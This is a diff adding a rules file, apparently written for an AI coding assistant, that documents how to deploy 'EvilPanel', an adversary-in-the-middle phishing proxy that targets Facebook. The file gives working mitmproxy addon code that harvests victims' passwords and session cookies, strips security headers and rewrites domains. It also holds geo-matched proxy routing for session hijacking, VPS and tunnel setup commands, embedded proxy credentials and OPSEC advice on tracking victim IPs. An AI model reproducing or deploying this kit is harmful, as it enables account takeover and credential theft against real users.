@@ -1,0 +1,434 @@
+---
+description: "TAGS: [redteam,evilpanel,vps,mitmproxy,aitm,deployment] | TRIGGERS: evilpanel,vps,mitmproxy,deploy,aitm,reverse-proxy | SCOPE: vps-deployment | DESCRIPTION: EvilPanel VPS deployment with mitmproxy AiTM configuration"
+alwaysApply: false
+---
+# EvilPanel VPS Deployment Module
+
+## Scope
+VPS deployment patterns for EvilPanel AiTM reverse proxy with mitmproxy.
+
+## VPS Architecture (152.42.229.105)
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                        VPS ARCHITECTURE                                  │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  [Cloudflared :8443] ──► [mitmproxy AiTM] ──► [Facebook.com]            │
+│                               │                                          │
+│                               ▼                                          │
+│                    [Session Token Capture]                               │
+│                    [c_user + xs + datr]                                  │
+│                               │                                          │
+│                               ▼                                          │
+│  [Cloudflared :8080] ──► [PHP Landing] ──► [Redirect to AiTM]           │
+│                               │                                          │
+│                               ▼                                          │
+│                    [Fingerprint Collection]                              │
+│                    [sessions.json]                                       │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+## Directory Structure
+
+```
+/opt/evilpanel/
+├── core/
+│   └── mitmproxy_addon.py    # AiTM proxy addon
+├── config/
+│   └── settings.py           # Configuration
+├── data/
+│   ├── evilpanel.db          # SQLite database
+│   ├── credentials.json      # Captured credentials
+│   └── sessions.json         # Captured sessions
+├── logs/
+│   └── mitmproxy.log         # Proxy logs
+├── certs/
+│   └── (mitmproxy certs)     # SSL certificates
+├── phishlets/
+│   └── facebook.yaml         # Target configuration
+├── run.py                    # Main launcher
+├── run_tunnel_mode.py        # Tunneled launcher
+├── start_tunneled.sh         # Startup script
+└── requirements.txt
+
+/opt/landing/
+├── index.php                 # Landing page template
+├── ip.php                    # Fingerprint collection
+├── validate.php              # Bot detection
+├── sessions.json             # Visitor logs
+├── php.log                   # PHP server log
+└── assets/
+```
+
+## mitmproxy Addon (core/mitmproxy_addon.py)
+
+### Configuration
+```python
+# ========== CONFIG ==========
+DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "your-domain.com")
+DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
+DB_PATH = os.path.join(DATA_DIR, "evilpanel.db")
+
+# DataImpulse credentials for geo-proxy
+DI_USER = "768b27aac68d92f840d9"
+DI_PASS = "b7564921f7b4962f"
+DI_HOST = "gw.dataimpulse.com"
+DI_PORT = 10000
+```
+
+### EvilPanelAddon Class
+```python
+class EvilPanelAddon:
+    def __init__(self):
+        self.domain = DOMAIN
+        self._init_db()
+        ctx.log.info(f"[EvilPanel v6.1] Smart Geo-Proxy with ASN Priority")
+    
+    def request(self, flow: http.HTTPFlow):
+        """Handle incoming requests."""
+        target_ip = flow.client_conn.peername[0]
+        
+        # Get geo data for victim IP
+        geo = get_geo(target_ip) if not target_ip.startswith("127.") else None
+        proxy_levels = build_proxy_levels(geo) if geo else []
+        
+        # Store in flow metadata
+        flow.metadata["target_ip"] = target_ip
+        flow.metadata["geo"] = geo
+        flow.metadata["proxy_levels"] = proxy_levels
+        
+        # Capture credentials from POST
+        if flow.request.method == "POST":
+            self._capture_creds(flow)
+        
+        # Rewrite host from phishing domain to real Facebook
+        if flow.request.host.endswith(self.domain):
+            flow.request.host = "m.facebook.com"
+            flow.request.headers["Host"] = "m.facebook.com"
+    
+    def response(self, flow: http.HTTPFlow):
+        """Handle responses."""
+        # Strip security headers
+        for h in ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"]:
+            if h in flow.response.headers:
+                del flow.response.headers[h]
+        
+        # Capture session tokens
+        self._capture_tokens(flow)
+        
+        # Rewrite cookies, locations, body
+        self._rewrite_cookies(flow)
+        self._rewrite_location(flow)
+        self._rewrite_body_hosts(flow)
+```
+
+### Credential Capture
+```python
+def _capture_creds(self, flow):
+    """Extract credentials from POST form data."""
+    form = dict(flow.request.urlencoded_form)
+    email = form.get("email") or form.get("username") or ""
+    password = form.get("pass") or form.get("password") or ""
+    
+    if email and password:
+        ip = flow.metadata.get("target_ip", "")
+        ua = flow.request.headers.get("User-Agent", "")
+        
+        ctx.log.info(f"[CRED] ✅ {email} from {ip}")
+        
+        # Save to JSON
+        record = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "email": email,
+            "password": password,
+            "ip": ip,
+            "ua": ua,
+            "path": flow.request.path
+        }
+        with open(os.path.join(DATA_DIR, "credentials.json"), "a") as f:
+            f.write(json.dumps(record) + "\n")
+        
+        # Save to SQLite
+        conn = sqlite3.connect(DB_PATH)
+        conn.execute(
+            "INSERT INTO credentials (email,password,ip_address,user_agent,request_path) VALUES (?,?,?,?,?)",
+            (email, password, ip, ua, flow.request.path)
+        )
+        conn.commit()
+        conn.close()
+```
+
+### Session Token Capture
+```python
+def _capture_tokens(self, flow):
+    """Extract session tokens from Set-Cookie headers."""
+    critical = ["c_user", "xs"]
+    all_tokens = ["c_user", "xs", "fr", "datr", "sb", "wd", "presence"]
+    captured = {}
+    
+    for name, vals in flow.response.cookies.items():
+        val = vals[0] if vals else ""
+        if name in all_tokens and val:
+            captured[name] = val
+    
+    # Only save if critical tokens present
+    if all(k in captured for k in critical):
+        ip = flow.metadata.get("target_ip", "")
+        
+        ctx.log.info(f"[SESSION] ✅ c_user={captured['c_user']} xs={captured['xs'][:18]}...")
+        
+        # Save to JSON
+        record = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "tokens": captured,
+            "ip": ip
+        }
+        with open(os.path.join(DATA_DIR, "sessions.json"), "a") as f:
+            f.write(json.dumps(record) + "\n")
+        
+        # Save to SQLite
+        conn = sqlite3.connect(DB_PATH)
+        conn.execute(
+            """INSERT INTO sessions (c_user,xs,fr,datr,sb,wd,presence,ip_address,all_cookies) 
+               VALUES (?,?,?,?,?,?,?,?,?)""",
+            (
+                captured.get("c_user", ""),
+                captured.get("xs", ""),
+                captured.get("fr", ""),
+                captured.get("datr", ""),
+                captured.get("sb", ""),
+                captured.get("wd", ""),
+                captured.get("presence", ""),
+                ip,
+                json.dumps(captured)
+            )
+        )
+        conn.commit()
+        conn.close()
+```
+
+### Cookie Domain Rewriting
+```python
+def _rewrite_cookies(self, flow):
+    """Rewrite cookie domains from facebook.com to our domain."""
+    cookies = flow.response.headers.get_all("Set-Cookie")
+    if not cookies:
+        return
+    
+    del flow.response.headers["Set-Cookie"]
+    
+    for c in cookies:
+        new_c = c
+        for dom in [".facebook.com", ".m.facebook.com", "facebook.com", "m.facebook.com"]:
+            new_c = new_c.replace(f"domain={dom}", f"domain=.{self.domain}")
+            new_c = new_c.replace(f"domain=.{dom.lstrip('.')}", f"domain=.{self.domain}")
+        flow.response.headers.add("Set-Cookie", new_c)
+```
+
+### Body URL Rewriting
+```python
+def _rewrite_body_hosts(self, flow):
+    """Rewrite Facebook URLs in response body to our domain."""
+    ct = flow.response.headers.get("Content-Type", "")
+    if not any(t in ct for t in ["text/html", "application/xhtml", "javascript"]):
+        return
+    
+    body = flow.response.get_text()
+    if not body:
+        return
+    
+    replacements = [
+        "https://m.facebook.com",
+        "https://facebook.com",
+        "https://www.facebook.com",
+        "http://m.facebook.com",
+        "//m.facebook.com",
+        "//www.facebook.com"
+    ]
+    
+    for dom in replacements:
+        body = body.replace(dom, f"https://{self.domain}")
+    
+    flow.response.set_text(body)
+```
+
+## Geo-Proxy Building
+
+```python
+def build_proxy_levels(geo):
+    """Build DataImpulse proxy URLs from most to least specific."""
+    if not geo:
+        return [(f"socks5://{DI_USER}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "BASE")]
+    
+    c = geo.get("country", "")
+    a = geo.get("asn", "")
+    s = geo.get("state", "")
+    ci = geo.get("city", "")
+    z = geo.get("zip", "")
+    
+    levels = []
+    
+    # FULL specificity (best for session injection)
+    if a and s and ci and z:
+        params = f"cr.{c};asn.{a};state.{s};city.{ci};zip.{z}"
+        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "FULL"))
+    
+    # NO_ZIP
+    if a and s and ci:
+        params = f"cr.{c};asn.{a};state.{s};city.{ci}"
+        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "NO_ZIP"))
+    
+    # NO_CITY
+    if a and s:
+        params = f"cr.{c};asn.{a};state.{s}"
+        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "NO_CITY"))
+    
+    # ASN_ONLY (minimum for Facebook fingerprint matching)
+    if a:
+        params = f"cr.{c};asn.{a}"
+        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "ASN_ONLY"))
+    
+    # COUNTRY_ONLY
+    if c:
+        params = f"cr.{c}"
+        levels.append((f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "COUNTRY_ONLY"))
+    
+    # BASE (last resort)
+    levels.append((f"socks5://{DI_USER}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "BASE"))
+    
+    return levels
+```
+
+## Deployment Commands
+
+### Initial Setup
+```bash
+# SSH to VPS
+ssh -i ~/.ssh/id_ed25519_maxphisher root@152.42.229.105
+
+# Install dependencies
+apt update && apt install -y python3-pip python3-venv
+
+# Setup EvilPanel
+cd /opt/evilpanel
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+```
+
+### Start Services
+
+#### mitmproxy AiTM (Port 8443)
+```bash
+# Set environment
+export EVILPANEL_DOMAIN="your-domain.trycloudflare.com"
+export EVILPANEL_DATA="/opt/evilpanel/data"
+
+# Start mitmproxy with addon
+cd /opt/evilpanel
+source venv/bin/activate
+mitmproxy --mode reverse:https://m.facebook.com/ \
+  --listen-port 8443 \
+  --ssl-insecure \
+  -s core/mitmproxy_addon.py \
+  2>&1 | tee logs/mitmproxy.log &
+```
+
+#### PHP Landing (Port 8080)
+```bash
+php -S 127.0.0.1:8080 -t /opt/landing 2>&1 | tee /opt/landing/php.log &
+```
+
+#### Cloudflared Tunnels
+```bash
+# Tunnel for AiTM (port 8443)
+cloudflared tunnel --url http://127.0.0.1:8443 &
+
+# Tunnel for Landing (port 8080)
+cloudflared tunnel --url http://127.0.0.1:8080 &
+```
+
+### Monitor Logs
+```bash
+# Watch for credentials
+tail -f /opt/evilpanel/logs/mitmproxy.log | grep -i -e POST -e SET-COOKIE
+
+# Watch sessions
+watch -n 1 "cat /opt/evilpanel/data/sessions.json | tail -20"
+
+# Watch landing page access
+tail -f /opt/landing/php.log
+```
+
+## Database Schema
+
+### credentials Table
+```sql
+CREATE TABLE credentials (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    email TEXT NOT NULL,
+    password TEXT NOT NULL,
+    ip_address TEXT,
+    user_agent TEXT,
+    fingerprint_id TEXT,
+    request_path TEXT,
+    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
+);
+```
+
+### sessions Table
+```sql
+CREATE TABLE sessions (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    c_user TEXT,
+    xs TEXT,
+    fr TEXT,
+    datr TEXT,
+    sb TEXT,
+    wd TEXT,
+    presence TEXT,
+    ip_address TEXT,
+    credential_id INTEGER,
+    all_cookies TEXT,
+    status TEXT DEFAULT 'active',
+    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    FOREIGN KEY (credential_id) REFERENCES credentials(id)
+);
+```
+
+## Sync Local → VPS
+
+```bash
+# From local machine
+rsync -avz --progress \
+  ~/universal-redteam-rules/core/.local_maxsites/facebook_evilpanel-maxphisher/ \
+  root@152.42.229.105:/opt/landing/ \
+  -e "ssh -i ~/.ssh/id_ed25519_maxphisher"
+
+rsync -avz --progress \
+  ~/universal-redteam-rules/evilpanel/ \
+  root@152.42.229.105:/opt/evilpanel/ \
+  -e "ssh -i ~/.ssh/id_ed25519_maxphisher"
+```
+
+## Running Process Status (VPS)
+
+```bash
+# Check running services
+ps aux | grep -E 'cloudflare|mitm|php'
+
+# Expected output:
+# cloudflared tunnel --url http://127.0.0.1:8443  (AiTM)
+# cloudflared tunnel --url http://127.0.0.1:8080  (Landing)
+# php -S 127.0.0.1:8080 -t /opt/landing           (PHP)
+```
+
+## OPSEC Requirements
+
+1. **Domain Separation**: Use different Cloudflared URLs for landing vs AiTM
+2. **Certificate Management**: Let mitmproxy auto-generate certs
+3. **Log Rotation**: Implement log rotation for mitmproxy.log
+4. **Data Encryption**: Encrypt sensitive data in SQLite
+5. **IP Logging**: Track victim IPs for geo-proxy matching
